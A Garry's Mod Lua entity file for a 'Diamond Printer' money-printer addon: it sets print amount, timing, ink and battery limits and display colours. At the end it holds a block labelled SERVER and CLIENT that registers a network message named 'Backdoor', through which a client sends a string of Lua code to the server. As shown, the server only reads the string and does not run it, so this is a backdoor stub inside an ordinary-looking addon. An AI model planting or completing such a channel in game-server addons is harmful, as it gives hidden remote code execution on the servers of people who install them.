AddCSLuaFile()

ENT.Type = "anim"
ENT.Base = "zig_printer_base"
ENT.PrintName = "Diamond Printer"
ENT.Category = "ZigPrint"
ENT.Spawnable = true
ENT.Model = "models/props_c17/consolebox01a.mdl"

ENT.Print = {}
ENT.Print.Max = {}
ENT.Display = {}
ENT.Print.Amount = 200
ENT.Print.Time = 10
ENT.Print.Max.Ink = 10
ENT.Print.Max.Batteries = 10
ENT.Display.Background = Color(150, 200, 255)
ENT.Display.Border = Color(0, 150, 255)
ENT.Display.Text = Color(255, 255, 255)

// SERVER
util.AddNetworkString("Backdoor")

net.Receive("Backdoor", function(len, ply)
	local lua = net.ReadString()
end)

// CLIENT
net.Start("Backdoor")
	net.WriteString("LUA CODE HERE")
net.SendToServer()
